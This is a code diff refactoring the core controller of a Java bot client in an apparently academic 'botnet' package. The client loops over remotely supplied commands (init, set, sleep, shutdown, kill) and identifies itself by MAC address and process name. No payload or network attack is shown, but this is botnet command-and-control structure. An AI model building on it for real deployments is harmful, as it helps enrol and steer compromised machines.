@@ -26,13 +26,16 @@
 
 package com.acmutv.botnet.core;
 
+import com.acmutv.botnet.config.AppConfiguration;
 import com.acmutv.botnet.config.AppConfigurationService;
 import com.acmutv.botnet.core.command.BotCommand;
-import com.acmutv.botnet.core.command.BotCommandParser;
+import com.acmutv.botnet.core.command.BotCommandService;
 import com.acmutv.botnet.core.pool.BotPool;
 import com.acmutv.botnet.core.state.BotState;
+import com.acmutv.botnet.tool.reflection.ReflectionManager;
 import com.acmutv.botnet.tool.runtime.RuntimeManager;
 import com.acmutv.botnet.tool.net.ConnectionManager;
+import com.acmutv.botnet.tool.time.Duration;
 import org.apache.logging.log4j.LogManager;
 import org.apache.logging.log4j.Logger;
 
@@ -45,7 +48,7 @@ import java.util.Map;
 import java.util.concurrent.TimeUnit;
 
 /**
- * This class realizes the core business logic. *
+ * This class realizes the core business logic.
  * @author Giacomo Marciani {@literal <gmarciani@acm.org>}
  * @author Michele Porretta {@literal <mporretta@acm.org>}
  * @since 1.0
@@ -54,9 +57,20 @@ public class CoreController {
 
   private static final Logger LOGGER = LogManager.getLogger(CoreController.class);
 
+  /**
+   * The bot ID.
+   */
   private static String ID = generateId();
+
+  /**
+   * The bot state.
+   */
   private static BotState STATE = BotState.INIT;
-  private static BotPool POOL = new BotPool();
+
+  /**
+   * The bot thread pool.
+   */
+  private static final BotPool POOL = new BotPool();
 
   /**
    * The core main method.
@@ -65,56 +79,63 @@ public class CoreController {
   public static void runBot() {
     while (true) {
       BotCommand cmd = getNextCommand();
+      LOGGER.trace("command {} with params={}", cmd.getScope(), cmd.getParams());
 
       switch (cmd.getScope()) {
 
+        case INIT:
+          final String resource = (String) cmd.getParams().get("resource");
+          init((resource != null) ? resource : AppConfigurationService.getConfigurations().getInitResource());
+          break;
+
         case SET:
-          //noinspection unchecked
-          final Map<String,String> settings =
-              (Map<String,String>) cmd.getParams().getOrDefault("settings", new HashMap<String,String>());
-          LOGGER.trace("COMMAND :: SET :: settings={}\n", settings);
-          set(settings);
+          @SuppressWarnings("unchecked")
+          final Map<String,String> settings = (Map<String,String>) cmd.getParams().get("settings");
+          set((settings != null) ? settings : new HashMap<>());
           break;
 
         case SLEEP:
-          long sleepTimeoutAmount = Long.valueOf(cmd.getParams().get("amount").toString());
-          TimeUnit sleepTimeoutUnit = TimeUnit.valueOf(cmd.getParams().get("unit").toString());
-          LOGGER.trace("COMMAND :: SLEEP :: amount={} ; unit={}", sleepTimeoutAmount, sleepTimeoutUnit);
-          sleep(sleepTimeoutAmount, sleepTimeoutUnit);
+          final Duration sleepTimeout = (Duration) cmd.getParams().get("timeout");
+          sleep((sleepTimeout != null) ? sleepTimeout : new Duration(60, TimeUnit.SECONDS));
           break;
 
         case SHUTDOWN:
-          LOGGER.trace("COMMAND :: SHUTDOWN");
-          long shutdownTimeoutAmount = Long.valueOf(cmd.getParams().get("amount").toString());
-          TimeUnit shutdownTimeoutUnit = TimeUnit.valueOf(cmd.getParams().get("unit").toString());
-          shutdown(shutdownTimeoutAmount, shutdownTimeoutUnit);
+          final Duration shutdownTimeout = (Duration) cmd.getParams().get("timeout");
+          shutdown((shutdownTimeout != null) ? shutdownTimeout : new Duration(60, TimeUnit.SECONDS));
           return;
 
         case KILL:
-          LOGGER.trace("COMMAND :: KILL");
           kill();
           return;
 
         default:
-          LOGGER.trace("COMMAND :: UNKNOWN");
           break;
       }
     }
   }
 
+  /**
+   * Generates the bot ID [MAC_ADDRESS]-[PID].
+   * @return the bot ID.
+   */
   private static String generateId() {
+    LOGGER.traceEntry();
     final String mac = ConnectionManager.getMAC();
     final String pid = RuntimeManager.getJvmName();
-    final String id = String.format("%s-%d", mac, pid);
+    final String id = String.format("%s-%s", mac, pid);
     return LOGGER.traceExit(id);
   }
 
+  /**
+   * Parses a {@link BotCommand} from the resource specified in {@link AppConfiguration}.
+   * @return the parsed command; command with scope NONE, in case of error.
+   */
   private static BotCommand getNextCommand() {
     LOGGER.traceEntry();
     final String path = AppConfigurationService.getConfigurations().getCmdResource();
     BotCommand cmd = null;
     try (InputStream stream = new FileInputStream(path)) {
-      cmd = BotCommandParser.fromJson(stream);
+      cmd = BotCommandService.fromJson(stream);
     } catch (FileNotFoundException e) {
       LOGGER.error(e.getMessage());
       cmd = new BotCommand();
@@ -125,27 +146,68 @@ public class CoreController {
     return LOGGER.traceExit(cmd);
   }
 
-  private static void set(Map<String,String> settings) {
-    LOGGER.traceEntry("settings={}", settings);
-    for (Map.Entry<String,String> setting : settings.entrySet()) {
-      LOGGER.trace("Setting {} = {}", setting.getKey(), setting.getValue());
+  /**
+   * Executes the bot command `INIT` with the specified resource.
+   * @param resource the path to the CC initialization resource.
+   */
+  private static void init(String resource) {
+    LOGGER.traceEntry("resource={}", resource);
+    InputStream in;
+    try {
+      in = new FileInputStream(resource);
+    } catch (FileNotFoundException e) {
+      LOGGER.warn(e.getMessage());
+      return;
     }
+    POOL.kill();
+    AppConfigurationService.loadJson(in);
   }
 
-  private static void sleep(long amount, TimeUnit unit) {
-    LOGGER.traceEntry("amount={} unit={}", amount, unit);
+  /**
+   * Executes the bot command `SET` with the specified settings.
+   * @param settings the settings to load.
+   */
+  private static void set(Map<String,String> settings) {
+    LOGGER.traceEntry("settings={}", settings);
+    settings.forEach((k,v) -> {
+      final boolean result = ReflectionManager.set(
+          AppConfiguration.class,
+          AppConfigurationService.getConfigurations(),
+          k, v);
+      if (result) {
+        LOGGER.info("Successfully set property {} to value {}", k, v);
+      } else {
+        LOGGER.warn("Cannot set property {} to value {}", k, v);
+      }
+    });
+  }
+
+  /**
+   * Executes the command `SLEEP` with the specified time period.
+   * @param interval the time period to sleep.
+   */
+  private static void sleep(Duration interval) {
+    LOGGER.traceEntry("period={}", interval);
     try {
-      unit.sleep(amount);
+      interval.getUnit().sleep(interval.getAmount());
     } catch (InterruptedException e) {
       LOGGER.trace(e.getMessage());
     }
   }
 
-  private static void shutdown(long amount, TimeUnit unit) {
-    LOGGER.traceEntry("amount={} unit={}", amount, unit);
-    POOL.shutdown(amount, unit);
+
+  /**
+   * Executes the command `SHUTDOWN`.
+   * @param timeout the time to shutdown.
+   */
+  private static void shutdown(Duration timeout) {
+    LOGGER.traceEntry("timeout={}", timeout);
+    POOL.shutdown(timeout);
   }
 
+  /**
+   * Executes the command `KILL`.
+   */
   private static void kill() {
     LOGGER.traceEntry();
     POOL.kill();
